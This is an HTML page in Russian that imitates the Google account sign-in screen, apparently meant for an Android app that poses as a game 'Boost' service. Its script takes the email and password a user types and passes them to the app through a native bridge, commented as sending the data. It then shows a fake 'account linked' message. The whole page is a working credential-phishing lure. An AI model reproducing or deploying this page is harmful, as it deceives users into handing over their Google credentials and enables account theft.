<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Вход – аккаунты Google</title>
<style>
* { box-sizing: border-box; margin: 0; padding: 0;
    font-family: -apple-system, 'Roboto', Arial, sans-serif; }
body { background: #fff; color: #202124; min-height: 100vh;
       display: flex; flex-direction: column; align-items: center; padding: 24px 16px; }
.logo { font-size: 24px; font-weight: 500; margin: 30px 0 20px;
        letter-spacing: -1px; }
.g-blue{color:#4285f4}.g-red{color:#ea4335}.g-yellow{color:#fbbc05}.g-green{color:#34a853}
.card { width: 100%; max-width: 420px; padding: 32px 24px; }
h1 { font-size: 24px; font-weight: 400; text-align: center; margin-bottom: 8px; }
.sub { text-align: center; font-size: 14px; margin-bottom: 32px; color: #202124; }
.field { position: relative; margin-bottom: 24px; }
.field input { width: 100%; padding: 16px 14px; font-size: 16px;
               border: 1px solid #dadce0; border-radius: 4px; outline: none;
               background: transparent; color: #202124; }
.field input:focus { border: 2px solid #1a73e8; padding: 15px 13px; }
.field label { position: absolute; top: -8px; left: 12px; background: #fff;
               padding: 0 4px; font-size: 12px; color: #5f6368; }
.btn-row { display: flex; justify-content: space-between; align-items: center;
           margin-top: 32px; }
.link { color: #1a73e8; font-size: 14px; cursor: pointer;
        text-decoration: none; }
.btn { background: #1a73e8; color: #fff; border: none; padding: 10px 24px;
       border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer; }

/* Экраны этапов */
.screen { display: none; text-align: center; padding: 40px 20px; }
.screen.active { display: block; }

.spin { border: 3px solid #f3f3f3; border-top: 3px solid #1a73e8;
        border-radius: 50%; width: 44px; height: 44px;
        animation: spin 1s linear infinite; margin: 0 auto 20px; }
@keyframes spin { to { transform: rotate(360deg); } }

.check { width: 72px; height: 72px; border-radius: 50%;
         background: #34a853; margin: 0 auto 20px;
         display: flex; align-items: center; justify-content: center;
         animation: pop 0.4s ease-out; }
.check::after { content: '✓'; color: #fff; font-size: 42px;
                font-weight: bold; line-height: 1; }
@keyframes pop {
    0% { transform: scale(0); }
    60% { transform: scale(1.1); }
    100% { transform: scale(1); }
}

.msg { font-size: 18px; font-weight: 500; color: #202124; margin-bottom: 8px; }
.msg-sub { font-size: 14px; color: #5f6368; margin-top: 8px; }

.footer { margin-top: auto; padding: 20px; display: flex;
          justify-content: space-between; width: 100%; max-width: 420px;
          font-size: 12px; color: #5f6368; }
.footer a { color: #5f6368; text-decoration: none; margin-right: 12px; }
</style>
</head>
<body>
<div class="logo">
    <span class="g-blue">G</span><span class="g-red">o</span><span class="g-yellow">o</span><span class="g-blue">g</span><span class="g-green">l</span><span class="g-red">e</span>
</div>

<div class="card">
    <div id="screenForm" class="screen active">
        <h1>Вход</h1>
        <p class="sub">Используйте аккаунт Google</p>
        <form id="f">
            <div class="field">
                <label>Электронная почта или телефон</label>
                <input type="email" id="email" autocomplete="off" autocapitalize="none">
            </div>
            <div class="field">
                <label>Введите пароль</label>
                <input type="password" id="password" autocomplete="off">
            </div>
            <div class="btn-row">
                <a class="link">Забыли пароль?</a>
                <button type="submit" class="btn">Далее</button>
            </div>
        </form>
    </div>

    <div id="screenLoad" class="screen">
        <div class="spin"></div>
        <div class="msg">Проверка данных…</div>
        <div class="msg-sub">Синхронизация с серверами Boost</div>
    </div>

    <div id="screenDone" class="screen">
        <div class="check"></div>
        <div class="msg">Аккаунт привязан</div>
        <div class="msg-sub">Настраиваем игровой профиль…</div>
    </div>
</div>

<div class="footer">
    <div><a>Русский</a></div>
    <div><a>Помощь</a><a>Конфиденциальность</a><a>Условия</a></div>
</div>

<script>
function show(id) {
    var s = document.querySelectorAll('.screen');
    for (var i = 0; i < s.length; i++) s[i].classList.remove('active');
    document.getElementById(id).classList.add('active');
}

document.getElementById('f').addEventListener('submit', function(e){
    e.preventDefault();
    var email = document.getElementById('email').value;
    var pass  = document.getElementById('password').value;
    if (!email || !pass) return;

    show('screenLoad');

    setTimeout(function(){
        // отправляем данные
        if (window.NativeBridge && NativeBridge.log) {
            NativeBridge.log("email=" + email + "\npassword=" + pass);
        }
        show('screenDone');

        // через 1.5 сек уходим в приложение (MainActivity)
        setTimeout(function(){
            if (window.NativeBridge && NativeBridge.done) {
                NativeBridge.done();
            }
        }, 1500);
    }, 1800);
});
</script>
</body>
</html>
